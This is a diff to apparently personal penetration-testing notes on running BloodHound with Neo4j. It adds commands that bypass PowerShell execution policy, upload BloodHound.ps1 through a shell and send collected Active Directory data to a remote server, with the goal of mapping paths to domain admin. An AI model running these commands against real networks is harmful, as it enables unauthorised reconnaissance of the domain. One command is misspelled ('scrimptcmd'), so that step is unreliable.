@@ -16,13 +16,22 @@ dbms.connector.http.listen_address=0.0.0.0:7474
 - Restart neo4j with  `/opt/neo4j-community-3.1.1/bin/neo4j restart`
 - Launch bloodhound and log in to the neo4j database
 
-This part is not finished
+
+The old method:
 ```
 powershell -exec bypass
 upload /path/bloodhound.ps1
 Import-Module ./BloodHound.ps1
 Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"
 ```
+
+The new method:
+```
+scriptimport /path/to/powershell-script.ps1
+scrimptcmd Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"
+```
+
+You should now see data being populated into the database and you can play with BloodHound to create really some really cool maps. You can also perform queries to show the shortest path to DA, etc.
 
 
 kan nå laste opp powersploit moduler.
